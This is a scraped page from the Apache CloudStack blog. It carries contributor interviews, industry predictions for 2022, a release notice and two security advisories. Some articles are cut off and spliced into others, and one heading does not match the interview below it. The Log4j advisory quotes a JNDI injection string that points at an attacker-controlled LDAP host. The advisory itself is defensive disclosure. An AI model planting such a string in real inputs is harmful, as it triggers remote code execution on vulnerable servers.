We are a welcoming society for new contributors and people keen on technology. This blog series will present you with recent CloudStack Committers and PMC members. Learn more about our tech society!</p><p>Meet Nicolas Vazquez! He is a Senior Software Engineer at ShapeBlue and is a PMC member of the Apache CloudStack project. He spends his time designing and implementing features in  CloudStack and can be seen acting as a release manager also.</p><p><strong>Introduce yourself with a few words?</strong></p><p>My name is Nicolas Vazquez, and I am a software engineer. I am 31 years old, based in Uruguay and work as a Senior Software Engineer at Shapeblue. I&#x27;m happily married and also a father of a young girl. I am a fan of sports, enjoy playing tennis and football. I also enjoy reading and listening to economic and political materials.</p><p><strong>Tell us your story in one Tweet?</strong></p><p>I have a degree in Computer Science and have worked on software development for the last 9 years. For the first years, I have worked mostly as a Java developer and since I met CloudStack I have been learning more about networking, storage, virtualisation. I became a CloudStack Committer in 2016 and a PMC member last year.</p><p><strong>When did you start your CloudStack journey?</strong></p><p>I have met CloudStack in 2015 while I was working for my previous job. I personally didn&#x27;t know about CloudStack but got assigned to a development project for it and that is where I started investigating and learning about it. I have been actively contributing and learning a lot since then.</p><p><strong>Who was your mentor during your CloudStack journey?</strong></p><p>My first mentor was Sergey Levitskiy. After I have joined Shapeblue, my mentor has been Rohit Yadav. I admire and appreciate both of them. I also enjoy acting as a mentor, recently have been assisting other community members - Suresh on the Release Management of the 4.16.1.0 release – which was released earlier this month.</p><p><strong>Which was the latest feature on which you contributed or what was your last commitment to the CloudStack project?</strong></p><p>My last commitment to CloudStack was acting as the Release Manager for the version 4.16.0 and also for the upcoming 4.17.0 version. Version 4.16.0 was released in November 2021 and introduces many interesting new features and improvements.</p><p>I am currently contributing by being the Release Manager for the upcoming 4.17 release of CloudStack. It is expected to bring a bunch of enhancements and new capabilities, such as improvements in the IPv6 support, shared networks, UX improvements for VM and volume migration and a lot more.</p><p><strong>Why do people need to choose open-source technology?</strong></p><p>I think the power of open-source technologies is that these solutions are not bound to any company and are the result of many individuals from different companies interacting and cooperating to build the best possible product. This is beneficial for the users as the product can be extended by anyone and contributed back to the whole community. Last but not least, the support of the community is also very important, and in my opinion, CloudStack is an excellent example of a successful open-source project.</p><p><strong>Learn more about Nicolas:</strong> <a href="https://github.com/nvazquez" target="_blank" rel="noopener noreferrer">https://github.com/nvazquez</a></p><p><strong>Follow him on Twitter: </strong><a href="https://twitter.com/nvazquezuy" target="_blank" rel="noopener noreferrer">https://twitter.com/nvazquezuy</a></p><p> </p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/community">community</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/blog/cloudstack-advisory-on-insecure-project">CloudStack Advisory on Insecure Project Invitation Token (CVE-2022-26779)</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2022-03-16T00:00:00.000Z" itemprop="datePublished">March 16, 2022</time></div></header><div class="markdown" itemprop="articleBody"><p>Apache CloudStack prior to 4.16.1.0 used insecure random number generation for project invitation tokens. If a project invite is created based only on an email address, a random token is generated. An attacker with knowledge of the project ID and the fact that the invite is sent, could generate time deterministic tokens and brute force attempt to use them prior to the legitimate receiver accepting the invite.</p><p>This feature is not enabled by default, the attacker is required to know or guess the project ID for the invite in addition to the invitation token, and the attacker would need to be an existing authorized user of CloudStack. Due to this the impact is considered low risk.

We are a welcoming society for new contributors and people keen on technology. This blog series will present you with recent CloudStack Committers and PMC members. Learn more about our tech society!</p><p>Meet Slavka Peleva from StorPool Storage. Slavka is a software developer and has been announced as a CloudStack Commiter at the end of 2021. She is part of the CloudStack community for the last 3 years and is excited to work on new features and capabilities to improve the open-source cloud management solution.</p><p> </p><p><strong>Introduce yourself with a few words?</strong><br>Hi, I am Slavka Peleva and I work at StorPool Storage as a software developer. I have a Bachelor&#x27;s Degree in Automation, information and control systems. I am a mother of a teenage boy. I love to read fantasy books, snowboarding in winters and rollerblading in summers.</p><p><strong>Tell us your story in one Tweet.</strong><br>I have always loved puzzles and brain teasers. For me, programming is an art. I have a passion for debugging and digging into the code.</p><p><br><strong>When did you start your CloudStack journey?</strong><br>In the middle of 2019 I have started to work at StorPool Storage. Then I did my first steps into CloudStack and it was my first open-source project. Since then I learned a lot and I met interesting people.</p><p><strong>Who was your mentor during your CloudStack journey?</strong><br>My colleagues at StorPool. I аm very happy that I have the chance to work with such exceptional professionals. Thanks to them the beginning was not so hard. I should also thank Rohit Yadav and ShapeBlue who shared with me the hackerbook. When I felt a bit comfortable in the community I have started to bother most of the guys :) I am glad that the people in CloudStack&#x27;s community are really supportive and nice and they have helped me in my journey.</p><p><strong>Which was the latest feature on which you contributed or what was your last commitment to the CloudStack project?</strong><br>Most of my contributing PRs are related to fixes with storage issues. One of the features that I have developed in CloudStack still did not get in but I hope that happens in the next release. It is for storage-based VM snapshots on KVM. Libvirt does not give the option to take virtual machine snapshots on images with RAW format. With this feature, the storage will have the functionality to take group consistent snapshots on all volumes of a virtual machine.</p><p><strong>Why do people need to choose open-source technology?</strong><br>The biggest advantage is the quality. A lot of developers are actively going through the code and making changes and only the best changes get into the final version. The contributions that every one of us does is what makes CloudStack such a powerful technology that so many system administrators and solutions architects use to build up their clouds.</p><p><strong>Learn more about Slavka:</strong> <a href="https://github.com/slavkap" target="_blank" rel="noopener noreferrer">https://github.com/slavkap</a></p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/community">community</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/blog/apache-cloudstack-lts-maintenance-release3">Apache CloudStack LTS Maintenance Release 4.16.1.0</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2022-03-07T00:00:00.000Z" itemprop="datePublished">March 7, 2022</time></div></header><div class="markdown" itemprop="articleBody"><a href="/img/imported/24029aa4-71d0-42df-880d-a6eb10610b80"><img loading="lazy" src="/img/imported/24029aa4-71d0-42df-880d-a6eb10610b80" alt="cs-4161.jpg" width="750" height="393" class="img_ev3q"></a><p>The Apache CloudStack project is pleased to announce the release of CloudStack 4.16.1.0.

Container-based cloud-native applications promise to deliver computing power independent of the cloud provider or hardware platform and is the biggest trend registered widely by users and the market, as there are changes in cultural and technological paradigms.</p><p>In terms of cloud management systems used to orchestrate Cloud/IaaS environments, the main goal for companies in 2022 is decreasing operational effort and thus costs. Providers will be looking for platforms that can increase their competitiveness and deliver predictable results while eliminating licensing and vendor lock-in.</p><p>Apache CloudStack follows the technology wave and responds to the user demand for innovation and improvement. As part of this strategy, it is integrating Kubernetes and extending IPv6 support in the latest versions. Huge progress has been made in the installation and upgrade processes, making Apache CloudStack even easier to maintain and operate.</p><p><br><strong>In this article, we will echo the voice of our community and wait for 2022 to pass to see which of the following predictions will become mainstream.</strong></p><p> </p><h2>Adoption of Open-source Technologies Will Continue to Grow</h2><p>Building an open-source environment with Apache CloudStack is a future-proof strategy for many Cloud / IaaS providers. A lot of enterprises now have the challenge of consolidating different environments under the hood of a single orchestration platform while ensuring minimal downtime of production environments. The CloudStack community believes that open-source, lightweight technologies like Apache CloudStack will be adopted more and more by companies who want to achieve simplicity, improve performance and scale instantly when needed. </p><p> </p><p>- <strong>Wido den Hollander, CEO/CTO at <a href="https://www.tws.eu/" target="_blank" rel="noopener noreferrer">CLouDINfra</a>:</strong></p><p><em>“My challenges for 2022 are migrating and adopting legacy infrastructure into our Cloud(Stack) environment. While keeping customer services up and running we want to achieve these goals. Having everything central in a single cloud management platform gives me better insight on our performance, capacity and expansion needs.”</em></p><p>- <strong>Boyan Ivanov, CEO, <a href="https://storpool.com/" target="_blank" rel="noopener noreferrer">StorPool:</a></strong></p><p><em>“The commoditization of IT started with the adoption of commodity hardware and open-source technologies like Linux &amp; KVM in hyperscalers. It is increasingly pervasive and leading to the commoditizing of the storage industry. We are seeing the emergence of Software-Defined Storage and Software-Defined Networking (among many other things), which have now become the default technologies to use in greenfield projects or refresh scenarios.”</em></p><p><em>- </em><strong>Sven Vogel, Senior Manager R&amp;D - Cloud and Infrastructure, <a href="https://www.ewerk.com/startseite" target="_blank" rel="noopener noreferrer">EWERK:</a></strong></p><p><em>“</em><em>Today, many infrastructure deployments are using open-source technology as a key component.  Through 2025, more than 70% of enterprises will increase their IT spending on open-source software, compared with their current IT spending, and by 2025, 75% of application development teams will implement software composition analysis tools in their workflow, up from 40% today, in order to minimize the security and licensing risks associated with open-source software. Source: <a href="https://www.gartner.com/doc/4004007" target="_blank" rel="noopener noreferrer">Gartner, <strong>Hype Cycle for Open-Source Software, 2021</strong></a>. </em></p><p><em>I share this assumption but I would also like to point out that more and more open-source projects hardly get any support. Many commercial companies are using OSS but it’s also important to understand that the industry needs to support the people who make the projects  live.” </em></p><p>– <strong>Giles Sirett, CEO, <a href="https://www.shapeblue.com/" target="_blank" rel="noopener noreferrer">ShapeBlue:</a></strong></p><p><em>“</em><em>Open-source is here to stay - there is no better software model for innovation and long-term sustainability. However, far too many companies do not have a solid strategy on open-source. They use open-source software but do not understand the open-source model and how to engage in that model. The recent Log4J vulnerability demonstrated this perfectly. I expect to see many organisations finally thinking about how to properly run open-source in their environments and recognising that they can’t just install the software and forget”</em></p><p> </p><h2>Kubernetes</h2><p>The approach to delivering microservices and containerized applications in recent years changed completely the way we design, develop, and run web applications. New principles enable developers to create cloud-native applications using Kubernetes which side-by-side with open-source, is a hot topic for most Apache CloudStack community members who share their visions.</p><p>- <a href="https://www.linkedin.com/in/gabriel-beims-brascher/" target="_blank" rel="noopener noreferrer"><strong>Gabriel Beims Bräscher, VP Apache CloudStack</strong></a><strong>:</strong></p><p><em>“We already see significant growth in deployed containerized workloads and there is no reason to believe in 2022 it won&#x27;t be a big deal. CloudStack also has been moving towards providing Kubernetes containers. This could trigger providers to start planning their move towards &quot;containers as a service&quot; as well.”</em></p><p>- <strong>Rohit Yadav, Principal Engineer, <a href="https://www.shapeblue.com/" target="_blank" rel="noopener noreferrer">ShapeBlue:</a></strong></p><p><em>“Kubernetes managed container-based workloads are becoming the new norm, and multi-arch container builds (same apps built as containers that can run on both x86, aarch64 etc. architectures) becoming easily available for most apps/software/packages will make this change and migration easier. For the end-users/developers at large, it doesn&#x27;t / won&#x27;t matter what tech/arch their workloads are running on.” </em></p><p>- <strong>Kshitish Purohit, Chief Product Officer, <a href="https://www.indiqus.com/" target="_blank" rel="noopener noreferrer">IndiQus Technologies</a>:</strong></p><p><em>“Kubernetes and cloud-native infrastructure will slowly start edging out virtualisation and traditional orchestration. And as this demand for cloud-native infrastructure grows, the older &#x27;enterprise&#x27; mindset will need to make way for decentralisation and autonomy.”</em></p><p>- <strong>Ezequiel McGovern - <a href="https://www.arsat.com.ar/" target="_blank" rel="noopener noreferrer">ARSAT</a>:</strong></p><p><em>“The new software solutions are implemented on container technology. With scaling, shared storage and high availability, we believe that this will lead to more common use of local hypervisor storage, allowing multizone solutions to be deployed without the need for the Cloud manager to perform additional tasks.”</em></p><p> </p><h2>COVID Impact on Cloud / IaaS providers</h2><p>Since the beginning of the COVID pandemic, we have seen a real impact in terms of life and workstyle. Inevitably two industries have developed the most during the pandemic – healthcare and IT. With the growing demand for XaaS,</p><p>- <strong>Rohit Yadav, Principal Engineer, <a href="https://www.shapeblue.com/" target="_blank" rel="noopener noreferrer">ShapeBlue:</a></strong></p><p><em>“Due to covid, WFH and remote working have become the new norm, and are here for the long term. This means demand for everything to support this life (work) style will continue to grow, with an increased need for Data Centre and cloud resources. Providers in telecom, data centre, and cloud space will continue to cater to this growing demand.” </em></p><p><em> </em></p><h2><em> A</em>RM Platform</h2><p>Recently, Apple introduced the ARM M1 processor as a replacement for Intel in its products, and KVM and VMware already support virtualization based on ARM processors. What’s next? Take a look at our predictions:</p><p>- <strong>Rohit Yadav, Principal Engineer, <a href="https://www.shapeblue.com/" target="_blank" rel="noopener noreferrer">ShapeBlue:</a></strong></p><p><em>“On the consumer front, most mobile and IoT devices are already ARM-based. Apple are leading the charge with their Mx series chips-based laptops and computers, and I think other manufacturers will follow (I think AMD should certainly consider grabbing this early market). We should see more ARM-based laptops in the next 5-10 yrs. More of these consumer devices means more developers will start using ARM-based computers to create apps, services, etc. that run on ARM and generate a requirement for more ARM-based servers/cloud providers. The strategy that will lead change is to build the ecosystem which is appearing to be working; a good business/developer benefit is that you&#x27;ll write apps that will then run on mobile, IoT, laptop/consumer computers, and also in the cloud.”</em></p><p> </p><h2>Edge Computing, Blockchain and Green Cloud</h2><p>The world&#x27;s data is expected to grow 61% to 175 zettabytes by 2025. According to Gartner, around 10% of enterprise-generated data is created and processed outside a traditional centralized data center or cloud. By 2025, Gartner predicts that this figure will reach 75%. The increase of IoT devices at the edge of the network is producing a massive amount of data - storing and using all that data in cloud data centers pushes network bandwidth requirements to the limit.</p><p>- <strong>Kshitish Purohit, Chief Product Officer, <a href="https://www.indiqus.com/" target="_blank" rel="noopener">IndiQus Technologies</a>:</strong></p><p><em>“Web3 is already here and 2022 is going to see a lot of movement happening in this space. The &#x27;decentralised tech&#x27; landscape will find firmer ground as more understanding is built on the use of blockchains, edge and the likes. 2021 already saw this potential with big companies (and even governments) adopting these new technologies - crypto, AI, AR, metaverse etc. - and these are going to continue on an upward trend.”</em></p><p>- <a href="https://www.linkedin.com/in/gabriel-beims-brascher/" target="_blank" rel="noopener"><strong>Gabriel Beims Bräscher, VP Apache CloudStack</strong></a><strong>:</strong></p><p><em>“We are still far from ideal &quot;green&quot; data centres, but this has become relevant in the past years. An example of the relevancy of this subject can be seen at the European Commission&#x27;s <a href="https://digital-strategy.ec.europa.eu/en/policies/green-cloud" target="_blank" rel="noopener noreferrer"><strong>Green cloud and green data centres</strong></a> policy. Additionally, studies show that moving companies&#x27; internal workloads to <a href="https://www.forbes.com/sites/forbestechcouncil/2021/09/23/how-cloud-migration-and-ai-can-help-reduce-carbon-footprint/" target="_blank" rel="noopener noreferrer">Cloud providers can reduce the CO2 footprint</a>. In 2022 we might see more ideas and proposals on how to improve efficiency, reducing energy costs and CO2 footprint. It is still hard to apply academic studies to the industry, but 2022 might be a year where we start changing it.”</em></p><p> </p><h2>IPv6 Stack</h2><p>The continued expansion of the internet relies on a greater number of IP addresses, and with the current limitation of the IPv4 stack, it is impossible to continue this expansion. The advent of cloud-native applications based on containerized microservices requires a relatively large number of public addresses, so the use of 128-bit IPv6 stacks that, theoretically allowing IP addresses, allows for continued expansion.</p><p>- <a href="https://www.linkedin.com/in/gabriel-beims-brascher/" target="_blank" rel="noopener"><strong>Gabriel Beims Bräscher, VP Apache CloudStack</strong></a><strong>:</strong></p><p><em>“It is not news, IPv4 is reaching its limit. And each year we see companies and services being moved towards IPv6. This includes recent movements in Kubernetes 1.23 where Dual-stack IPv4 / IPv6 Networking has reached general availability (GA), in the last quarter of 2021.”</em></p><p> </p><h2>Market Dynamics</h2><p>– <strong>Giles Sirett, CEO, <a href="https://www.shapeblue.com/" target="_blank" rel="noopener noreferrer">ShapeBlue:</a></strong></p><p><em>“</em><em>The meteoritic growth in the IaaS market is well documented and predicted by most analysts to continue strongly through 2022. There are lots of different numbers flying around but most of the analysts seem to settle on a c.30% YoY growth for IaaS – taking it to near 100 billion markets in 2022.  Interestingly, the market share for the hyperscalers remains constant at about 80% - as much as most service providers would love to have some of that 80%, that still leaves a 20 billion growth market for everybody else.”</em></p><p>- <strong>Ezequiel McGovern - <a href="https://www.arsat.com.ar/" target="_blank" rel="noopener">ARSAT</a>:</strong></p><p><em>“The concept of buying VMs will gradually change to buying Docker clusters (K8S) or similar solutions, so cloud managers have to prepare to provide services that are further away from the hypervisor.”</em></p><p> </p><h2>Private Cloud No More</h2><p>The private or on-premise cloud allows a company to run workloads in their private data center. It is increasingly common to see companies migrating their workloads to cloud providers, thus reducing CAPEX-related costs. See the prediction on this topic below.</p><p>– <strong>Giles Sirett, CEO, <a href="https://www.shapeblue.com/" target="_blank" rel="noopener noreferrer">ShapeBlue:</a></strong></p><p><em>“For a decade, the term private cloud has been used to describe a set of orchestrated/automated infrastructure components to give users a “cloud-like” experience of their own internal infra. Increasingly, environments such as this are being used as the foundation for automation – they become part of the plumbing instead of the end goal itself. I’d therefore predict the term private-cloud starting to disappear from our lexicon.”</em></p><p> </p><h2>Hybrid Cloud</h2><p>The use of multiple clouds, public and on-premise, allows operators to run applications based on containers in geographically dispersed locations of different providers, thus increasing the high availability of the applications and reducing the latency since, depending on the architecture, it allows operators to distribute the workloads to the cloud closest to the users using IP geolocation as well as edge clouds.</p><p>- <strong>Boyan Ivanov, CEO, <a href="https://storpool.com/" target="_blank" rel="noopener">StorPool:</a></strong></p><p><strong>Hybrid capabilities become crucial going forward </strong>– <em>“Due to mixed environments and new workloads, storage complexity is increasing, not decreasing. So agility, portability, and well-documented APIs are now prime considerations when designing cloud-native applications. These applications should run on-premises and off-premises in the same manner but on different hardware and software stacks. So agility, flexibility, versatility, integrations and APIs become key KPIs of a storage solution, along with performance (think latency, IOPS, GB/S) and TCO (think Total Cost of Ownership, $/GB)</em>.”</p><p> </p><h2>Traditional SAN and Software-Defined-Storage</h2><p>On the storage market, the innovations and SDS will continue steadily to replace legacy technologies. It&#x27;s a natural case of evolution. By using API-compatible devices, you can control granular details like IOPs, snapshots and scaling without any headaches. The natural evolution of storage is software-defined storage (SDS), decoupling and abstracting storage resources from the underlying hardware platform for greater flexibility, efficiency and rapid scalability, making storage resources programmable and scalable.</p><p>- <strong>Boyan Ivanov, CEO, <a href="https://storpool.com/" target="_blank" rel="noopener">StorPool:</a></strong></p><p><em>“The diversity from emerging applications puts strain on traditional, legacy SAN products and platforms. The storage solutions </em><em>have been largely unchanged for the last three decades, except for the introduction of faster storage media (SSDs / NVMes) and extra data management software pieces (AI, anyone?) on top of the same underlying rigid architecture. Yet the large-scale, complex, and versatile IT platforms that power businesses today need a new generation of powerful and versatile storage platforms. These storage platforms can cover multiple use-cases, performance tiers, have API-first management, and linearly scale to sizes which were impossible with the traditional SAN architecture. Besides: who wants to buy and manage five different types of SAN / AFA family groups if they can have one or two best-in-class, latest generation SDS storage solutions?”  </em></p><p>- <strong>Ezequiel McGovern - <a href="https://www.arsat.com.ar/" target="_blank" rel="noopener">ARSAT</a>:</strong></p><p><em>“Regarding the shared storage needs for classic solutions, the use of Ceph will be established, since it has shown in production that everything it promises is fulfilled in real life.”</em></p><p> </p><h2>Conclusion</h2><p>The predictions seem clear and achievable. As a constantly developing software, Apache CloudStack follows the trends and evolves with the market needs. Apache CloudStack follows the open-source philosophy and has a strong and united community. It has recently been integrated with Kubernetes and extended IPv6 support for VPC and isolated networks. The Apache CloudStack use cases cover edge computing and hybrid cloud workloads. Besides that, the market for IaaS/Cloud will generate greater demand for hyperscalers, but also for service providers.</p></div><footer class="row docusaurus-mt-lg"></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/blog/meet-the-community-david-jumani">Meet the Community - David Jumani</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2022-01-13T00:00:00.000Z" itemprop="datePublished">January 13, 2022</time></div></header><div class="markdown" itemprop="articleBody"><p><a href="/img/imported/1033b38c-1717-4707-9098-fdc208260857"><img loading="lazy" src="/img/imported/1033b38c-1717-4707-9098-fdc208260857" alt="Meet-CS-Community-David-Jumani.png" width="750" class="img_ev3q"></a></p><p>The Apache CloudStack Community is an ever-growing and rapidly-developed community of people all around the globe committed to open-source technology.

Learn more about her!</p><b>Introduce yourself with a few words?</b><p>Hi, I&#x27;m Pearl Dsilva, with about 5 years of experience in Telecommunications and Cloud Computing. I&#x27;m based in Bangalore, India, and currently work at ShapeBlue. I have done my Bachelor&#x27;s Degree in Engineering in E&amp;C. Since then, my career has been mainly in Telecommunications and Cloud management.
I am an avid reader who likes to devour fiction books and binge-watch series over weekends. Self-learning and self-motivation are the mantras that I follow to keep myself abreast with new things in our field of work. Never averse to taking a new role, responsibilities, and tasks that require reinventing myself.</p><b>Tell us your story in one Tweet.</b><p>An Electronics &amp; Communications Engineer who developed an interest in networking and communications in distributed systems. Over the years, I&#x27;ve had the opportunity to work in cloud computing, network management, cloud automation, and orchestration. I would like to give credit to my first company, where I joined as a campus recruit for providing me guidance, training, and exposure in the related field. The mentors that I had played a massive role in skill development which has played a significant role in what I am today. All this led me to an opportunity to work on CloudStack and be a part of the community.</p><b>When did you start your CloudStack journey?</b><p>In November 2019, I started dabbling with CloudStack. It began as something that I did as part of my job. But as time passed by, I realised it was fun working on an open-source project. There are many ways to contribute and be involved, and the community members are helpful. And this journey goes on …</p><b>Who was your mentor during your CloudStack journey?</b><p>Rohit Yadav has been an absolute mentor right from day one. From helping me understand CloudStack to getting me around with how the community works, Rohit&#x27;s always been there to help and support. He has been a great motivator, especially the role he played during the onboarding process. The learning by interacting with him and the other community members has been immense.</p><b>Which was the latest feature on which you contributed, or what was your last commitment to the CloudStack project?</b><p>Among the features I&#x27;ve worked on, the most recent ones include enabling automatic upgrades in CloudStack - without needing to register the SystemVM template prior to the upgrade, support for bulk actions in the UI, and custom Resource Icons support.</p><b>Why do people need to choose open-source technology?</b><p>Opensource software is agile and flexible, and the users can easily contribute or propose ideas that they intend to see in the project. Furthermore, it is backed by an involved community, which makes it a better option compared to proprietary software in many ways.</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/community">community</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/blog/log4jshell">CloudStack Advisory on Apache Log4j Zero Day (CVE-2021-44228)</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2021-12-13T00:00:00.000Z" itemprop="datePublished">December 13, 2021</time></div></header><div class="markdown" itemprop="articleBody"><p>On 9th December 2021, a new zero-day vulnerability for Apache Log4j was reported. It is by now tracked under CVE-2021-44228:</p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" target="_blank" rel="noopener noreferrer">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228</a>.<p>CVE-2021-44228 vulnerability is classified under the highest severity mark and allows an attacker to execute arbitrary code by injecting a sub-string in the form &quot;${jndi:ldap://some.attacker-controlled.site/}&quot; into a logged message. Apache Log4j 2.x is reported to be affected as it performs a lookup (string substitution) using the JNDI protocol, whenever the &quot;${jndi:...}&quot; string is found within a message parameter.</p><p>The Apache <a href="https://github.com/apache/logging-log4j2/pull/608#issuecomment-990494126" target="_blank" rel="noopener noreferrer">Log4j developers</a> and the <a href="http://slf4j.org/log4shell.html" target="_blank" rel="noopener noreferrer">SLF4J project advisory</a> confirm that Apache Log4j 1.x does not offer a look-up mechanism and does not suffer remote code execution (RCE) vulnerability from CVE-2021-44228.</p><p>All Apache CloudStack releases since v4.6 use Apache Log4j version 1.2.17 and therefore are not affected by this RCE vulnerability. Most users who haven&#x27;t changed the default log4j xml config don&#x27;t need to do anything, advanced users can check and fix their log4j xml configuration if they&#x27;re using any custom JMS appenders.</p><p>The Apache CloudStack project will consider migrating to a different version of Apache Log4j in future releases.</p></div><footer class="row docusaurus-mt-lg"></footer></article><nav class="pagination-nav" aria-label="Blog list page navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/blog/page/2"><div class="pagination-nav__label">Newer Entries</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/blog/page/4"><div class="pagination-nav__label">Older Entries</div></a></nav></main></div></div></div><footer class="footer"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://cloudstack.apache.org/" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/img/banner.svg" alt="Apache CloudStack logo" class="themedImage_ToTc themedImage--light_HNdA footer__logo"><img src="/img/banner.svg" alt="Apache CloudStack logo" class="themedImage_ToTc themedImage--dark_i4oU footer__logo"></a></div><div class="footer__copyright"><div style="text-align: left;">
